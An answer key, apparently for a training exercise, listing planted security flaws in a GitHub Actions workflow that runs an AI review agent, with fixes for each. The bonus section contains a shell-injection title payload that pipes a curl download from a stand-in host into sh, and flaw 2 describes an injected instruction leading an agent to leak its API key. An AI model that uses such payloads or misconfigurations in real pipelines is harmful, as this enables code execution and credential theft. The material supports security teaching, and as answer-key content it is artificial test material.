# Flawed workflow: answer key

The three planted flaws, then the bonus ones pairs often spot.

## 1. Fork code runs with secrets

`pull_request_target` runs in the base repo's context, with secrets and a write token. The checkout then pulls the PR's head, and the next steps install its requirements and run its script. A stranger's fork PR executes their code with your key.

**Fix:** trigger on `pull_request`. Skip forks, or run them only after a maintainer approves. Run the reviewer script from the base branch, not from the PR.

## 2. A long-lived key where a shell-capable agent can read it

`GEMINI_API_KEY` is set at job level, so every step sees it, including `pip install` of PR-controlled packages. The agent runs with `--allow-shell` and also holds `GITHUB_TOKEN` with `write-all`. One injected instruction and it can print the key or push to the repo.

**Fix:** put the key in an environment secret, scope it to the one step that calls the model, and give the agent no shell and no GitHub token. Set `permissions: {}` at the top and grant each job only what it needs. Post the comment from a separate job.

## 3. No brakes on spend

No `concurrency`, no `timeout-minutes`, no diff size limit, and it runs on every push to every PR, drafts and bots included. Twenty pushes are twenty paid reviews running at once.

**Fix:** `concurrency` with `cancel-in-progress`, a job timeout, a diff size limit, skip drafts and bot PRs, and a spend cap on the API project.

## Bonus

- `${{ github.event.pull_request.title }}` inside `run:` is shell injection: a title like `"; curl evil.sh | sh; "` becomes a command. Pass it through `env:`.
- `actions/checkout@v7` is a movable tag, and `persist-credentials` is left on, so the token sits in `.git/config`. Pin a commit SHA and set `persist-credentials: false`.
- `google-antigravity` is unpinned.
- No lint, test or secret-scan gate runs before the paid step.

The fixed version is `shipit-ci/.github/workflows/ai-review.yml`.
